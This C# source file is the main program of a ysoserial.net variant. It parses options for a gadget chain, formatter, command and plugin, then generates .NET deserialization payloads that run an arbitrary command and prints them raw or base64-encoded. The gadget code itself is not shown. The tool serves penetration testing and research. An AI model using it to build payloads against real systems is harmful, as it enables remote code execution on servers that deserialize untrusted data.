using ysoserial_frmv2.Generators;
using ysoserial_frmv2.Plugins;
using System;
using System.IO;
using System.Linq;
using NDesk.Options;
using System.Runtime.Remoting;
using System.Text;

namespace ysoserial_frmv2
{
    class Program
    {
        static void Main(string[] args)
        {
            string format = "";
            string gadget = "";
            string formatter = "";
            string cmd = "";
            string plugin_name = "";
            Boolean test = false;
            Boolean show_help = false;

            OptionSet options = new OptionSet()
            {
                {"p|plugin=", "the plugin to be used", v => plugin_name = v },
                {"o|output=", "the output format (raw|base64).", v => format = v },
                {"g|gadget=", "the gadget chain.", v => gadget = v },
                {"f|formatter=", "the formatter.", v => formatter = v },
                {"c|command=", "the command to be executed.", v => cmd = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                {"h|help", "show this message and exit", v => show_help = v != null },
            };

            try
            {
                var notMatchedArguments = options.Parse(args);
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial --help' for more information.");
                System.Environment.Exit(-1);
            }

            if (
                (cmd == "" || formatter == "" || gadget == "" || format == "") &&
                plugin_name == ""
            )
            {
                Console.WriteLine("Missing arguments.");
                show_help = true;
            }

            var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());

            // Populate list of available gadgets
            var generatorTypes = types.Where(p => typeof(Generator).IsAssignableFrom(p) && !p.IsInterface);
            var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList();

            // Populate list of available plugins
            var pluginTypes = types.Where(p => typeof(Plugin).IsAssignableFrom(p) && !p.IsInterface);
            var plugins = pluginTypes.Select(x => x.Name.Replace("Plugin", "")).ToList();

            // Show help if requested
            if (show_help)
            {
                Console.WriteLine("ysoserial.net generates deserialization payloads for a variety of .NET formatters.");
                Console.WriteLine("");
                if (plugin_name == "")
                {
                    Console.WriteLine("Available formatters:");
                    foreach (string g in generators)
                    {
                        try
                        {
                            if (g != "Generic")
                            {
                                ObjectHandle container = Activator.CreateInstance(null, "ysoserial_frmv2.Generators." + g + "Generator");
                                Generator gg = (Generator)container.Unwrap();
                                Console.WriteLine("\t" + gg.Name() + " (" + gg.Description() + ")");
                                Console.WriteLine("\t\tFormatters:");
                                foreach (string f in gg.SupportedFormatters().ToArray())
                                {
                                    Console.WriteLine("\t\t\t" + f);
                                }
                            }
                        }
                        catch
                        {
                            Console.WriteLine("Gadget not supported");
                            System.Environment.Exit(-1);
                        }

                    }
                    Console.WriteLine("");
                    Console.WriteLine("Available plugins:");
                    foreach (string p in plugins)
                    {
                        try
                        {
                            if (p != "Generic")
                            {
                                ObjectHandle container = Activator.CreateInstance(null, "ysoserial_frmv2.Plugins." + p + "Plugin");
                                Plugin pp = (Plugin)container.Unwrap();
                                Console.WriteLine("\t" + pp.Name() + " (" + pp.Description() + ")");
                                //Console.WriteLine("\t\tOptions:");
                                //pp.Options().WriteOptionDescriptions(Console.Out);
                            }
                        }
                        catch
                        {
                            Console.WriteLine("Plugin not supported");
                            System.Environment.Exit(-1);
                        }

                    }
                    Console.WriteLine("");
                    Console.WriteLine("Usage: ysoserial_frmv2.exe [options]");
                    Console.WriteLine("Options:");
                    options.WriteOptionDescriptions(Console.Out);
                    System.Environment.Exit(0);
                }
                else
                {
                    try
                    {
                        ObjectHandle container = Activator.CreateInstance(null, "ysoserial_frmv2.Plugins." + plugin_name + "Plugin");
                        Plugin pp = (Plugin)container.Unwrap();
                        Console.WriteLine("Plugin:\n");
                        Console.WriteLine(pp.Name() + " (" + pp.Description() + ")");
                        Console.WriteLine("\nOptions:\n");
                        pp.Options().WriteOptionDescriptions(Console.Out);
                    } catch
                    {
                        Console.WriteLine("Plugin not supported");
                    }
                    System.Environment.Exit(-1);
                }
            }

            object raw = null;

            // Try to execute plugin first
            if (plugin_name != "")
            {
                if (!plugins.Contains(plugin_name))
                {
                    Console.WriteLine("Plugin not supported.");
                    System.Environment.Exit(-1);
                }

                // Instantiate Plugin 
                Plugin plugin = null;
                try
                {
                    var container = Activator.CreateInstance(null, "ysoserial_frmv2.Plugins." + plugin_name + "Plugin");
                    plugin = (Plugin)container.Unwrap();
                }
                catch
                {
                    Console.WriteLine("Plugin not supported!");
                    System.Environment.Exit(-1);
                }

                raw = plugin.Run(args);
    
            }
            // othersiwe run payload generation
            else if (cmd != "" && formatter != "" && gadget != "" && format != "")
            {
                if (!generators.Contains(gadget))
                {
                    Console.WriteLine("Gadget not supported.");
                    System.Environment.Exit(-1);
                }

                // Instantiate Payload Generator
                Generator generator = null;
                try
                {
                    var container = Activator.CreateInstance(null, "ysoserial_frmv2.Generators." + gadget + "Generator");
                    generator = (Generator)container.Unwrap();
                }
                catch
                {
                    Console.WriteLine("Gadget not supported!");
                    System.Environment.Exit(-1);
                }

                // Check Generator supports specified formatter
                if (generator.IsSupported(formatter))
                {
                    raw = generator.Generate(cmd, formatter, test);
                }
                else
                {
                    Console.WriteLine("Formatter not supported. Supported formatters are: " + string.Join(", ", generator.SupportedFormatters().ToArray()));
                    System.Environment.Exit(-1);
                }

                // LosFormatter is already base64 encoded
                if (format.ToLower().Equals("base64") && formatter.ToLower().Equals("losformatter"))
                {
                    format = "raw";
                }
            }

            // If requested, base64 encode the output
            if (format.ToLower().Equals("base64"))
            {
                if (raw.GetType() == typeof(String))
                {
                    raw = Encoding.ASCII.GetBytes((String)raw);
                }
                string b64encoded = Convert.ToBase64String((byte[])raw);
                Console.WriteLine(b64encoded);
            }
            else
            {
                MemoryStream data = new MemoryStream();
                if (raw.GetType() == typeof(String))
                {
                    data = new MemoryStream(Encoding.UTF8.GetBytes((String)raw ?? ""));
                }
                else if (raw.GetType() == typeof(byte[]))
                {
                    data = new MemoryStream((byte[])raw);
                }
                else
                {
                    Console.WriteLine("Unsupported serialized format");
                    System.Environment.Exit(-1);
                }

                using (Stream console = Console.OpenStandardOutput())
                {
                    byte[] buffer = new byte[4 * 1024];
                    int n = 1;
                    while (n > 0)
                    {
                        n = data.Read(buffer, 0, buffer.Length);
                        console.Write(buffer, 0, n);
                    }
                    console.Flush();
                }
            }
        }
    }
}
